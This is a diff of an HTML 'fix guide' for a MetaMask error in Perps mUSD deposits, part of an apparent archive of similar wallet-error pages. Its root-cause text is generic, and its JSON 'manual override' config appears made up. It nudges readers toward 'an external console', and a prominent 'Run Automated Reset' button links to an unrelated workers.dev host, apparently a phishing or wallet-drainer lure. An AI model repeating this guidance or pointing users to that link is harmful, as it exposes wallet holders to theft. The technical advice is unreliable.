@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available Error – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #1a1a24;
+        font-family: -apple-system;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #cf6679; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,34 +42,37 @@
 <h1>Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message when attempting to deposit and convert mUSD using the Metamask extension, specifically stating "This payment route isn't available".</li>
+<li>Users encounter an error message stating "This payment route isn't available" when attempting to deposit and convert mUSD using the Metamask extension for Perps.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a compatibility issue between the Metamask extension and the payment routing protocol, resulting in the extension being unable to find a suitable payment route for the conversion.</li>
+<li>The error occurs due to a temporary issue with the payment routing mechanism within the Metamask extension, which is unable to establish a viable payment path for the requested transaction.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Attempt to update the Metamask extension to the latest version to ensure compatibility with the latest payment routing protocols.</li>
-<li>Manually configure the payment route using the following JSON configuration:</li>
+<li>Attempt to restart the Metamask extension and retry the transaction.</li>
+<li>Check for updates to the Metamask extension and ensure you are running the latest version.</li>
+<li>Utilize the following JSON configuration to manually override the payment routing:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;paymentRoute&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;protocol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ETH&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;currency&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mUSD&quot;</span>
+<span class="w">  </span><span class="nt">&quot;paymentRoute&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;manual&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;routeConfig&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;mUSD&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;conversionRate&quot;</span><span class="p">:</span><span class="w"> </span><span class="mf">1.0</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;fee&quot;</span><span class="p">:</span><span class="w"> </span><span class="mf">0.01</span>
+<span class="w">    </span><span class="p">}</span>
 <span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
+<p>Consider utilizing an external console to diagnose and resolve the issue. </p>
+<h2>Prerequisites</h2>
 <ul>
-<li>Clear the Metamask extension's cache and restart the browser to ensure the changes take effect.</li>
+<li>Metamask extension installed and configured</li>
+<li>Latest version of the Ethereum blockchain client</li>
+<li>Sufficient ETH balance for transaction fees</li>
 </ul>
-<p>Prerequisites:
-* Metamask extension installed and configured
-* Ethereum wallet set up and funded
-* Latest version of the browser installed</p>
-<p>Consider utilizing an external console to troubleshoot and resolve the issue.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
